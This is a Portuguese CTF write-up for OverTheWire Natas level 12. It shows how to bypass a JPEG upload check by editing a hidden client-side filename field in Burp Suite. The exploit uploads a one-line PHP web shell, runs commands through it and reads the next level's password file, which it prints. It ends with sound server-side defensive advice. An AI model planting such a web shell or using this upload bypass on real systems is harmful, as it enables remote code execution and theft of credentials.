# 🕵️ Natas - Nível 12 (🇧🇷 Português)  
*Data: 03/06/2025*    
*Dificuldade: Média*   
*Categoria: Web* 

---

## 🎯 Objetivo

O objetivo deste desafio é identificar e explorar uma vulnerabilidade de upload de arquivos que permite a manipulação de nomes de arquivos no lado do cliente, resultando em Execução Remota de Código (RCE) para obter a senha do próximo nível (Natas13).  

---

## 🔎 Análise

- A aplicação web em `http://natas12.natas.labs.overthewire.org/` oferece uma funcionalidade de upload de imagens JPEG com um limite de tamanho de 1KB.  
- Tentativas de bypass de extensão comuns (ex: `.php.jpg`, `test.php%00.jpg` - null byte) não funcionaram, pois o servidor sempre anexa `.jpg` ao nome final, invalidando a execução como PHP.  
- A análise do código fonte da página HTML revelou um campo oculto no formulário de upload: `<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`.  
- Este campo oculto pré-define o nome do arquivo que será salvo no servidor, incluindo a extensão `.jpg`, antes mesmo de o usuário selecionar o arquivo para upload.  
- A vulnerabilidade reside no fato de que o nome final do arquivo é controlado por um valor pré-populado no lado do cliente (via campo `hidden`), que pode ser interceptado e manipulado.
- Nosso objetivo é alterar a extensão de `.jpg` para `.php` no campo `filename` da requisição HTTP para que o servidor salve nosso arquivo com a extensão correta.
- O payload a ser enviado será um simples shell PHP: `<?php system($_GET['cmd']); ?>`, permitindo a execução de comandos via parâmetro `cmd` na URL. 

---

## 🧱 Etapas

1. Acessar a Aplicação: Navegar até `http://natas12.natas.labs.overthewire.org/`.  
2. Testar o Upload: Tentar fazer upload de um arquivo para observar o comportamento do servidor (renomeando para `.jpg`).  
3. Analisar o Código Fonte: Inspecionar o código HTML da página de upload para identificar o campo `input type="hidden" name="filename"`.  
4. Preparar o Payload: Criar um arquivo PHP (ex: `bypass.php`) com o conteúdo `<?php system($_GET['cmd']); ?>`.  
5. Interceptar a Requisição: Utilizando a ferramenta proxy `Burp Suite` para capturar a requisição de upload do arquivo.  
6. Manipular o Nome do Arquivo: Na requisição interceptada, localizar o parâmetro `filenamee` alterar sua extensão para `.php `(ex: c36r0bea02.jpg para c36r0bea02.php).  
7. Enviar a Requisição: Enviar a requisição modificada para o servidor.
8. Verificar Upload: O servidor retornará uma mensagem confirmando o upload do arquivo com a extensão .php (ex: The file `upload/dnfplwi4tz.php` has been uploaded).
9. Acessar o Shell Web: Navegar até a URL do arquivo PHP recém-enviado (ex: `http://natas12.natas.labs.overthewire.org/upload/dnfplwi4tz.php`). Observar as mensagens de erro ("Notice: Undefined index: cmd", "Warning: system(): Cannot execute a blank command"), que confirmam que o PHP está interpretando o arquivo.
10. Executar Comandos: Testar a execução de comandos adicionando o parâmetro cmd na URL (ex: `http://natas12.natas.labs.overthewire.org/upload/dnfplwi4tz.php?cmd=pwd`). Confirmar o RCE.
11. Obter a Senha: Executar o comando para ler o arquivo de senha do Natas13: `http://natas12.natas.labs.overthewire.org/upload/dnfplwi4tz.php?cmd=cat%20/etc/natas_webpass/natas13`.  

---

## 🔑 Senha Encontrada

```
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

---

## ✅ Conclusão

A vulnerabilidade foi explorada com sucesso ao manipular o campo filename de um input hidden no formulário de upload, que era preenchido no lado do cliente. Isso permitiu o bypass da validação de extensão do servidor e o upload de um shell PHP. A execução remota de código foi confirmada e a senha para o próximo nível foi obtida. Este caso destaca o perigo de confiar em qualquer tipo de controle de entrada do lado do cliente para a segurança da aplicação, especialmente em funcionalidades de upload.

---

## 🧪 Comandos Utilizados

Conteúdo do arquivo shell.php:
PHP

<?php system($_GET['cmd']); ?>
Acesso ao shell web (após upload e manipulação do nome):http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php
Verificar RCE:http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php?cmd=pwd
Obter senha do Natas13:http://natas12.natas.labs.overthewire.org/upload/[nome_aleatorio].php?cmd=cat%20/etc/natas_webpass/natas13

---

## 🧠 Observações

Validação Server-Side é Crucial: Nunca confie em validações feitas apenas no lado do cliente (JavaScript, campos HTML ocultos). Sempre revalide todas as entradas no lado do servidor.
Whitelist para Extensões e Tipos MIME: Em vez de blacklists, use whitelists (listas de permissão) para extensões de arquivos e tipos MIME permitidos para upload.
Renomeação Segura de Arquivos: Ao renomear arquivos, use um nome gerado aleatoriamente e uma extensão validada no servidor, sem permitir qualquer entrada do usuário no nome ou extensão final.
Isolamento de Uploads: Arquivos enviados por usuários devem ser armazenados em um diretório fora da raiz web ou configurado para não permitir execução de scripts.


---

## 📎 Scripts desenvolvidos

shell.php: Um shell PHP simples (<?php system($_GET['cmd']); ?>) utilizado para a execução remota de comandos.

---

<p align="center"> <a href="../Natas11/Readme-BR.md">⬅️ Anterior</a> • <a href="../Natas13/Readme-BR.md">Proximo ➡️</a> </p>
